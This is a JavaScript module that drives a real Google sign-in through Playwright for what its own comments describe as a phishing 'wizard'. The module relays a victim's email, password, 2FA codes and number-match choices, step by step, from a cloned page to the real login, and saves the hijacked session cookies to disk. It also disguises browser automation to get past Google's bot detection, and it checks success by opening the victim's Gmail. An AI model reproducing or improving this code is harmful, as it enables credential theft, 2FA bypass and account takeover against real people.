import { chromium } from 'playwright';
import path from 'path';
import fs from 'fs';
import { fileURLToPath } from 'url';
import { authenticator } from 'otplib';
import { getSecrets } from './store.js';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const SESSIONS_DIR = path.join(__dirname, '..', 'sessions');

// id -> { context, page }
const active = new Map();

export function isOpen(id) {
  return active.has(id);
}

export function activeIds() {
  return [...active.keys()];
}

function userDataDir(id) {
  const dir = path.join(SESSIONS_DIR, id);
  fs.mkdirSync(dir, { recursive: true });
  return dir;
}

// The wizard-driven login (stealing credentials step-by-step) and the admin's
// explicit Open/Auto-login both use a HEADed (normal, visible) Google sign-in,
// so the real sign-in is a genuine one you can watch and finish (2FA / device
// challenges) by hand. The switch must happen at launch (persistent contexts
// can't toggle it).
async function launch(id, { headless = true } = {}) {
  const dir = userDataDir(id);
  // Real Chrome + these flags are what let Google's sign-in through:
  // - channel 'chrome': the real installed Chrome, most trusted fingerprint
  // - hide the automation banner/flag so navigator.webdriver is false
  // - headless (Chrome's new headless) is far less detectable than the old one,
  //   so silent wizard login stays under Google's radar without a visible window
  const baseOpts = {
    headless,
    // Headless: let Chrome give us a maximized surface. Headed: force an explicit
    // viewport so the window never opens with a broken/too-short height (a server
    // without a real desktop would otherwise open a tiny default-size window).
    viewport: headless ? null : { width: 1440, height: 900 },
    // Google's sign-in serves a stripped-down "WebLiteSignIn" and rejects headless
    // automation unless we masquerade as real Chrome. The UA + removing the
    // automation banner are what let a genuine sign-in through.
    userAgent:
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    ignoreDefaultArgs: ['--enable-automation'],
    args: [
      '--start-maximized',
      '--no-first-run',
      '--no-default-browser-check',
      '--disable-blink-features=AutomationControlled',
    ],
  };
  let context;
  try {
    context = await chromium.launchPersistentContext(dir, { ...baseOpts, channel: 'chrome' });
  } catch {
    context = await chromium.launchPersistentContext(dir, baseOpts);
  }
  // Google immediately rejects automated browsers ("this browser or app may not
  // be secure" -> /signin/rejected) unless we mask the driving marks. The
  // canonical fix is to override navigator.webdriver BEFORE any page script runs.
  await context.addInitScript(() => {
    Object.defineProperty(navigator, 'webdriver', { get: () => false });
  });
  const page = context.pages()[0] || (await context.newPage());
  // headless flag: a persistent context can't toggle visibility after launch, so
  // callers that need a VISIBLE window must relaunch headed instead of reusing an
  // entry that was opened headless.
  const entry = { context, page, headless };
  active.set(id, entry);
  context.on('close', () => active.delete(id));
  return entry;
}

// Open the session's browser (or focus it if already open) and navigate to a URL.
export async function open(id, url, opts = {}) {
  const wantHeadless = !!opts.headless;
  let entry = active.get(id);
  // If the session was previously opened HEADLESS (e.g. a silent wizard login left
  // it in `active`) and the caller now wants a VISIBLE window, we can't switch a
  // persistent context to headed in place — close it and relaunch headed. `close`
  // removes it from `active` via the 'close' handler so we get a clean launch.
  if (entry && entry.headless && !wantHeadless) {
    await entry.context.close().catch(() => {});
    entry = null;
  }
  if (!entry) entry = await launch(id, { headless: wantHeadless });
  if (url) {
    try {
      await entry.page.bringToFront();
      await entry.page.goto(url, { waitUntil: 'domcontentloaded', timeout: 45000 });
    } catch (e) {
      // navigation errors shouldn't kill the open browser
    }
  }
  return entry;
}

export async function close(id) {
  const entry = active.get(id);
  if (!entry) return false;
  try {
    await entry.context.close();
  } catch {}
  active.delete(id);
  return true;
}

export async function closeAll() {
  for (const id of [...active.keys()]) {
    // eslint-disable-next-line no-await-in-loop
    await close(id);
  }
}

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// Resolve whatever TOTP value we were handed into the digits to type into Google:
// - a 6-digit numeric code (what a victim reads off their authenticator app) ->
//   type it straight in, it is already valid for the current time window.
// - anything else (a Base32 "setup key" captured from the admin panel / invite)
//   -> generate the current rolling code from that secret.
function totpValue(secretOrCode) {
  const s = String(secretOrCode || '').trim();
  if (/^\d{6}$/.test(s)) return s;
  return s ? authenticator.generate(s.replace(/\s+/g, '')) : '';
}

// Google surfaces account-level errors (wrong password, unknown account, bad 2FA
// code) in Material error containers. The exact container the victim edits can
// vary as Google redesigns the page, so we scan a small set of known containers
// and only trust text that reads like a real Google error. Returns the trimmed
// error text, or null if no recognizable error is showing.
const ERROR_SELECTORS = [
  'div[jsname]',
  '[role="alert"]',
  '.o6cuMc',
  '.qerror',
  '#passwordError',
  '#identifierError',
];
// Match only the actual error sentence Google shows (not the surrounding form
// text that may share the container). Each captures one error.
const ERROR_RE =
  /(wrong password[^.\n]*|couldn'?t find your google account[^.\n]*|enter a valid (?:email|phone|password)[^.\n]*|to continue, first verify[^.\n]*|(?:verification )?code (?:is )?(?:incorrect|wrong)[^.\n]*|that was the wrong code[^.\n]*)/i;

function extractError(t) {
  const m = t.match(ERROR_RE);
  return m ? m[1].trim() : null;
}

async function detectGoogleError(page) {
  for (const sel of ERROR_SELECTORS) {
    const els = await page.locator(sel).all().catch(() => []);
    for (const el of els) {
      if (await el.isVisible().catch(() => false)) {
        const t = (await el.innerText().catch(() => '')).trim();
        const err = extractError(t);
        if (err) return err;
      }
    }
  }
  return null;
}

// After submitting a password, wait for Google to either accept it (the password
// field disappears / the flow advances) or reject it (a real error appears).
// Never blindly advance on a wrong password. Returns { accepted } when we should
// move on, or { error } with the Google error text when it was rejected.
async function waitPasswordOutcome(page, pw, timeout) {
  const start = Date.now();
  while (Date.now() - start < timeout) {
    const err = await detectGoogleError(page);
    if (err) return { error: err };
    if (!(await pw.isVisible().catch(() => false))) return { accepted: true };
    await sleep(500);
  }
  // Still on the password field and no error text surfaced => safest to treat it
  // as a bad password rather than silently continue to 2FA.
  return { error: 'Wrong password. Try again or click Forgot password to reset it.' };
}

// Best-effort assisted login. Pre-fills credentials in the persistent context.
// Returns { status, message }. Leaves the browser OPEN so 2FA / challenges can
// be completed by hand when they can't be automated. `headless` defaults to true
// for the silent wizard login; the admin panel opens a visible (headed) browser.
export async function login(session, { headless = true } = {}) {
  const secrets = getSecrets(session.id) || { password: '', totpSecret: '' };
  const entry = await open(session.id, undefined, { headless });
  const page = entry.page;

  if (session.provider === 'google') {
    return googleLogin(page, session, secrets);
  }

  // Generic provider: just navigate to the login URL for a manual sign-in.
  if (session.loginUrl) {
    try {
      await page.goto(session.loginUrl, { waitUntil: 'domcontentloaded', timeout: 45000 });
    } catch {}
  }
  return { status: 'new', message: 'Opened login page. Complete sign-in manually in the browser window.' };
}

// Are we still on a plain sign-in field screen (email or password)? If so the
// page doesn't count as a second-factor challenge regardless of other markers.
async function isFieldScreen(page) {
  if (await page.locator('#identifierId, input[name="identifier"]').first().isVisible().catch(() => false)) return true;
  if (await page.locator('input[type="password"]').first().isVisible().catch(() => false)) return true;
  return false;
}

// Read the selectable NUMBER options Google shows on the "pick the number"
// challenge some accounts get after the password (typically three 2-digit codes,
// occasionally phone-number options on the "choose a phone" variant). An option
// = a clickable element whose ENTIRE visible text is a digit string / phone
// number and nothing else. Returns the option texts (max 8, de-duplicated) in
// document order so the clone can mirror them and click the matching real one.
async function readNumberOptions(page) {
  try {
    const els = await page
      .locator('a, button, [role="button"], [role="menuitemradio"], [role="option"]')
      .all();
    const seen = new Set();
    const options = [];
    for (const el of els) {
      if (!(await el.isVisible().catch(() => false))) continue;
      const t = (await el.innerText().catch(() => '')).trim();
      if (!t || t.length > 18) continue;
      if (!/^\+?\d[\d\s\-().]{1,17}$/.test(t)) continue; // digits/phone only
      if (seen.has(t)) continue;
      seen.add(t);
      options.push(t);
      if (options.length >= 8) break;
    }
    return options;
  } catch {
    return [];
  }
}

// Detect which second-factor / verification screen is on display. Returns:
//   { kind: 'code' }                  -> a numeric code input is shown (authenticator
//                                        / SMS / e-mail code)
//   { kind: 'numchoice', options[] }  -> "pick the number" options: >= 2 clickable
//                                        elements whose whole text is a 2+-digit
//                                        number (no code input, no sign-in fields)
//   { kind: 'prompt' }                -> approve-on-phone / "Confirm it's you" style
//   null                              -> no second-factor challenge in sight
async function detect2FA(page) {
  const totpName = page.locator('input[name="totpPin"], input#totpPin').first();
  if (await totpName.isVisible().catch(() => false)) return { kind: 'code' }; // explicit Google totp field
  const code = page
    .locator('input[type="tel"][name], input[autocomplete="one-time-code"], input[inputmode="numeric"]')
    .first();
  if (await code.isVisible().catch(() => false)) {
    // Only trust a generic numeric/OTP input if there is genuinely no email or
    // password field showing (i.e. we are NOT on the sign-in field screens).
    if (await isFieldScreen(page)) return null; // still a field screen, not 2FA
    console.log(`[gsession] detect2FA code-input matched: ${await code.evaluate((el) => el.outerHTML.slice(0, 120)).catch(() => '?')}`);
    return { kind: 'code' };
  }
  // "Pick the number" challenge: some accounts show a page of clickable number
  // tiles (e.g. three different 2-digit codes) to choose from instead of typing
  // a code. The headings on these pages ALSO match the CHALL markers below, so
  // this must run BEFORE the challenge-text scan.
  if (!(await isFieldScreen(page))) {
    const options = await readNumberOptions(page);
    if (options.length >= 2) {
      console.log(`[gsession] detect2FA num-choice page, options: ${options.join(' / ')} @ ${page.url().slice(0, 90)}`);
      return { kind: 'numchoice', options };
    }
  }
  // No code field, no number options. Google's challenge screens (approve-on-phone,
  // or a code we can't bind) come in several shapes and the H1 ALONE is unreliable —
  // so scan the headings AND the action links/buttons AND body copy for any marker
  // that this is a second-factor screen rather than a plain sign-in field.
  let labels = '';
  try {
    const parts = await Promise.all([
      page.locator('h1, h2, h3').allInnerTexts(),
      page.locator('a, button, [role="button"]').allInnerTexts(),
      page.locator('body').innerText(),
    ]);
    labels = parts.join(' ');
  } catch {}
  labels = labels.toLowerCase();
  const CHALL =
    /verify it'?s you|confirm it'?s you|check your phone|check your (?:google account|email)|try another way|use another (?:way|method)|we (?:'ve?|will)?\s*sent (?:you\s+)?(?:a\s+)?(?:code|notification)|tap (?:yes|approve)|authenticator app|6[- ]?digit (?:code|verification)|enter the (?:last\s+|6-?|)?digits|backup code|it'?s been a while since/i;
  if (CHALL.test(labels)) {
    console.log(`[gsession] detect2FA challenge page (approve/prompt) @ ${page.url().slice(0, 90)}`);
    return { kind: 'prompt' };
  }
  return null;
}

// DOM/URL assessment of the real login state — "what is the live backend Google
// page asking for right now?" The wizard mirrors ONLY this reported state, so the
// clone never invents a screen Google isn't actually showing. States:
//   'email'     -> on the email/identifier screen
//   'password'  -> on the password screen
//   'code'      -> Google wants a 6-digit code (authenticator app / SMS / email)
//   'approve'   -> Google wants you to Approve on your phone ("Confirm it's you")
//   'numchoice' -> Google shows selectable number options (some accounts: a page
//                  of e.g. three 2-digit numbers to pick the matching one); the
//                  live options are carried in `options`
//   'verifying' -> transitional / signed-in-ish but unproven (NOT signed-in yet)
//   'signed-in' -> confirmed signed in (Gmail reachable) — set by settleAndVerify()
//   'error'     -> Google rejected the attempt
async function assessLogin(page) {
  const url = page.url();
  if (/\/signin\/rejected/.test(url)) {
    return {
      status: 'error',
      state: 'error',
      message: 'Google blocked this sign-in ("this browser or app may not be secure"). Open it and finish by hand once — the session is then saved and reused.',
    };
  }
  // Genuine signed-in URLs. NOTE: `/signin/continue` is deliberately EXCLUDED —
  // it's the "continue to <app>" intermediate, NOT a signed-in state. Treating it
  // as logged-in is what made a bogus email report "Signed in successfully".
  if (
    /(^|\/)myaccount\.google\.com/.test(url) ||
    /gds\.google\.com\/web/.test(url) ||
    /\/oauth\/consent/.test(url) ||
    /(^|\/)mail\.google\.com\/(mail\/|u\/\d+)/.test(url) ||
    /ManageAccount/.test(url)
  ) {
    return { status: 'pending', state: 'verifying', message: 'Looks signed in — verifying on Gmail…' };
  }

  const idf = page.locator('#identifierId, input[name="identifier"], input[type="email"]').first();
  if (await idf.isVisible().catch(() => false)) {
    return { status: 'new', state: 'email', message: 'Waiting on the email step.' };
  }

  // A second-factor challenge (code / number-choice / phone-approve) is never "signed in".
  const fa = await detect2FA(page);
  if (fa) {
    if (fa.kind === 'numchoice') {
      return {
        status: 'pending',
        state: 'numchoice',
        options: fa.options,
        message: 'Select the number that matches this sign-in attempt on Google.',
      };
    }
    return fa.kind === 'code'
      ? { status: 'pending', state: 'code', message: 'Enter the 6-digit code from your authenticator app (or the code Google texted/mailed you).' }
      : { status: 'pending', state: 'approve', message: 'Google is confirming it\u2019s you — open the notification on your phone and tap Approve.' };
  }

  const pw = page.locator('input[type="password"]').first();
  if (await pw.isVisible().catch(() => false)) {
    return { status: 'new', state: 'password', message: 'Waiting on the password step.' };
  }

  // Nothing recognizable and no signed-in URL -> transitional. Never claim signed-in
  // here; settleAndVerify() proves it for real by reaching Gmail.
  const dbgHeading = (await page.locator('h1, h2, h3').first().innerText().catch(() => '')).trim().slice(0, 80);
  console.log(`[gsession] assessLogin -> 'verifying' @ ${page.url().slice(0, 90)} heading="${dbgHeading}"`);
  return { status: 'pending', state: 'verifying', message: 'Checking your sign-in…' };
}

// The real SUCCESS test (per the requirement): the stolen session must ACTUALLY
// reach Gmail. Load Gmail — if genuinely signed in, the inbox opens; if not,
// Google bounces us to a sign-in page. 'signed-in' is only ever based on this.
async function verifyGmail(page) {
  try {
    await page.goto('https://mail.google.com/', { waitUntil: 'domcontentloaded', timeout: 25000 });
  } catch {}
  await sleep(3000);
  return /mail\.google\.com\/(mail\/|u\/\d+)/.test(page.url());
}

// Settle the current step, then CONFIRM success the only way that counts:
// reaching Gmail.
//   - a live 'code'/'approve' challenge is returned as-is so the wizard mirrors it;
//   - otherwise we prove it with verifyGmail() -> 'signed-in'; if Gmail won't open
//     yet, report 'verifying' so the wizard keeps polling.
async function settleAndVerify(page) {
  await sleep(2500);
  const st = await assessLogin(page);
  if (st.status === 'error') return st;
  if (st.state === 'code' || st.state === 'approve' || st.state === 'numchoice') return st;
  if (await verifyGmail(page)) {
    return { status: 'logged-in', state: 'signed-in', message: 'Signed in — session is live (Gmail opens).' };
  }
  return { status: 'pending', state: 'verifying', message: 'Almost there — verifying your sign-in…' };
}

// Kept as the call-site name (googleLogin / wizardPhase still call settleLogin).
async function settleLogin(page) {
  return settleAndVerify(page);
}

// Live login state, re-read on demand — the wizard POLLS this while the victim
// completes a phone-approve on their device, or while Google finishes settling.
// It never captures a credential; it just re-reports the current state.
export async function loginState(id) {
  let entry = active.get(id);
  if (!entry) {
    try { entry = await open(id, undefined, { headless: false }); } catch {}
    entry = active.get(id) || entry;
  }
  if (!entry) return { status: 'pending', state: 'verifying', message: '' };
  return settleAndVerify(entry.page);
}

async function googleLogin(page, session, secrets) {
  try {
    await page.goto('https://accounts.google.com/', { waitUntil: 'domcontentloaded', timeout: 45000 });
    await sleep(2000);

    // already signed in?
    const pre = await assessLogin(page);
    if (pre?.status === 'logged-in') return { status: 'logged-in', message: 'Already signed in.' };

    // --- email ---
    const email = page.locator('#identifierId, input[name="identifier"], input[type="email"]');
    if (await email.count()) {
      await email.first().fill(session.username);
      await clickNext(page, 'Next');
      await sleep(3500);
    }
    console.log(`[gsession] ${session.id} email step -> ${page.url().slice(0, 60)}`);

    const afterEmail = await assessLogin(page);
    if (afterEmail?.status === 'error') return afterEmail;
    console.log(`[gsession] ${session.id} after email: ${afterEmail?.status}`);

    // --- password ---
    const pw = page.locator('input[type="password"][name="Passwd"], input[type="password"]:visible');
    await pw.first().waitFor({ state: 'visible', timeout: 15000 }).catch(() => {});
    if (await pw.count()) {
      if (!secrets.password) {
        return { status: 'new', message: 'No stored password. Finish signing in manually in the browser window.' };
      }
      await pw.first().fill(secrets.password);
      await clickNext(page, 'Next');
      // wait for authentication to accept the password — never advance on a wrong one
      const outcome = await waitPasswordOutcome(page, pw.first(), 15000);
      console.log(`[gsession] ${session.id} password outcome: ${outcome.error ? 'ERROR ' + outcome.error : 'accepted'}`);
      if (outcome.error) return { status: 'error', message: outcome.error };
    }

    // --- 2FA / TOTP (only if a code field is actually shown) ---
    const totp = page.locator('input[name="totpPin"], input#totpPin, input[type="tel"], input[autocomplete="one-time-code"], input[inputmode="numeric"]');
    if ((await totp.count()) && secrets.totpSecret) {
      const code = totpValue(secrets.totpSecret);
      await totp.first().fill(code);
      await clickNext(page, 'Next');
      await sleep(4000);
      console.log(`[gsession] ${session.id} filled 2FA code from stored secret`);
    }

    return await settleLogin(page);
  } catch (e) {
    return {
      status: 'error',
      message: `Auto-login could not complete (${e.message}). Finish sign-in manually in the browser window.`,
    };
  }
}

// ---------------------------------------------------------------------------
// Incremental "live" login. The remote wizard submits one credential at a time
// (username -> password -> 2FA). Each submitted step drives the *real* Google
// sign-in forward in this session's persistent Chrome, so by the time the
// wizard is done the actual logged-in session (cookies, not a stored secret)
// already exists on disk under sessions/<id>/. Phases are serialized per
// session so out-of-order HTTP arrivals can never race each other.
// ---------------------------------------------------------------------------
const queues = new Map();

export function wizardPhase(key, id, value) {
  const prev = queues.get(id) || Promise.resolve();
  const run = prev.then(() => wizardPhaseInner(key, id, value));
  queues.set(id, run.catch(() => {})); // keep the chain alive even on failure
  return run;
}

async function wizardPhaseInner(key, id, value) {
  try {
    // "Normal Google": the behind-the-scenes login is a real, visible (headed)
    // Google sign-in — you can watch it and finish any 2FA / device check by
    // hand — rather than a hidden headless (puppeteer-style) automation.
    const page = (await open(id, undefined, { headless: false })).page;

    if (key === 'username') {
      await page
        .goto('https://accounts.google.com/', { waitUntil: 'domcontentloaded', timeout: 45000 })
        .catch(() => {});
      await sleep(1200);
      const email = page.locator('#identifierId, input[name="identifier"], input[type="email"]');
      if (await email.count()) {
        await email.first().fill(String(value || ''));
        await clickNext(page, 'Next');
        // Watch the REAL browser move: wait until Google asks for the password,
        // or signs us in, or rejects the email. Only report what Google does.
        const pw = page.locator('input[type="password"][name="Passwd"], input[type="password"]:visible').first();
        const start = Date.now();
        while (Date.now() - start < 10000) {
          const err = await detectGoogleError(page);
          if (err) {
            console.log(`[gsession] ${id} username step -> ERROR: ${err}`);
            return { status: 'error', state: 'error', message: err };
          }
          if (await pw.isVisible().catch(() => false)) {
            console.log(`[gsession] ${id} username step -> Google asks for password`);
            return { status: 'new', state: 'password', message: 'Waiting on the password step.' };
          }
          const pre = await assessLogin(page);
          if (pre.state === 'code' || pre.state === 'approve' || pre.state === 'numchoice') return pre; // challenge right away
          if (pre.state === 'verifying') {
            // maybe already signed in (remembered on this profile) — prove it.
            const v = await settleAndVerify(page);
            if (v.state === 'signed-in') {
              console.log(`[gsession] ${id} username step -> signed in (verified on Gmail)`);
              return v;
            }
          }
          await sleep(500);
        }
      }
      const res = await assessLogin(page);
      if (res.state === 'password' || res.state === 'code' || res.state === 'approve' || res.state === 'numchoice' || res.status === 'error') {
        console.log(`[gsession] ${id} username step -> ${res.state}`);
        return res;
      }
      // not clearly on the password screen — verify whether it's actually signed in
      const settled = await settleAndVerify(page);
      console.log(`[gsession] ${id} username step -> ${settled.state}`);
      return settled;
    }

    if (key === 'password') {
      const pw = page.locator('input[type="password"][name="Passwd"], input[type="password"]:visible');
      await pw.first().waitFor({ state: 'visible', timeout: 15000 }).catch(() => {});
      if (await pw.count()) {
        await pw.first().fill(String(value || ''));
        await clickNext(page, 'Next');
        // wait for the real auth to accept — never continue on a wrong password
        const outcome = await waitPasswordOutcome(page, pw.first(), 15000);
        console.log(`[gsession] ${id} password step -> ${outcome.error ? 'ERROR ' + outcome.error : 'accepted'}`);
        if (outcome.error) return { status: 'error', state: 'error', message: outcome.error };
      }
      const res = await settleLogin(page);
      console.log(`[gsession] ${id} password step settled state -> ${res.state} (${res.status})`);
      return res;
    }

    if (key === 'totp') {
      const codeBox = page.locator('input[name="totpPin"], input#totpPin, input[type="tel"], input[autocomplete="one-time-code"], input[inputmode="numeric"]');
      if ((await codeBox.count()) && value) {
        await codeBox.first().fill(totpValue(value));
        await clickNext(page, 'Next');
        await sleep(2000);
      }
      const err = await detectGoogleError(page);
      if (err) {
        console.log(`[gsession] ${id} totp step -> ERROR: ${err}`);
        return { status: 'error', state: 'error', message: err };
      }
      const res = await settleLogin(page);
      console.log(`[gsession] ${id} totp step settled state -> ${res.state} (${res.status})`);
      return res;
    }

    if (key === 'numchoice') {
      // The victim picked one of the number options the page shows. Click the
      // option on the REAL Google page whose text exactly equals that number —
      // the same way they would have tapped it. Then settle as after other steps.
      const wanted = String(value || '').trim();
      const clicked = await clickNumberOption(page, wanted);
      console.log(`[gsession] ${id} numchoice -> "${wanted}" ${clicked ? 'clicked on real page' : 'NOT FOUND (settling as-is)'}`);
      if (clicked) await sleep(2000);
      const err = await detectGoogleError(page);
      if (err) {
        console.log(`[gsession] ${id} numchoice step -> ERROR: ${err}`);
        return { status: 'error', state: 'error', message: err };
      }
      const res = await settleLogin(page);
      console.log(`[gsession] ${id} numchoice step settled state -> ${res.state} (${res.status})`);
      return res;
    }

    return await settleLogin(page);
  } catch (e) {
    return {
      status: 'error',
      message: `Wizard login could not complete (${e.message}). Finish sign-in manually in the browser window.`,
    };
  }
}

// Click the number tile on the "pick the number" challenge: the clickable
// element on the page whose ENTIRE visible text equals the number the victim
// chose from the mirrored clone. Returns true if a matching option was clicked.
async function clickNumberOption(page, num) {
  if (!num) return false;
  try {
    const els = await page
      .locator('a, button, [role="button"], [role="menuitemradio"], [role="option"]')
      .all();
    for (const el of els) {
      if (!(await el.isVisible().catch(() => false))) continue;
      const t = (await el.innerText().catch(() => '')).trim();
      if (t === num) {
        await el.click();
        return true;
      }
    }
  } catch {}
  return false;
}

// Click Google's "Next"/submit: by id if present, else the visible button by
// its label, else just press Enter.
async function clickNext(page, labelText) {
  const byId = page.locator('#identifierNext, #passwordNext, #totpNext');
  if (await byId.count()) {
    await byId.first().click().catch(() => {});
    return;
  }
  try {
    const byRole = page.getByRole('button', { name: labelText, exact: false });
    if (await byRole.count()) {
      await byRole.first().click();
      return;
    }
  } catch {}
  await page.keyboard.press('Enter').catch(() => {});
}
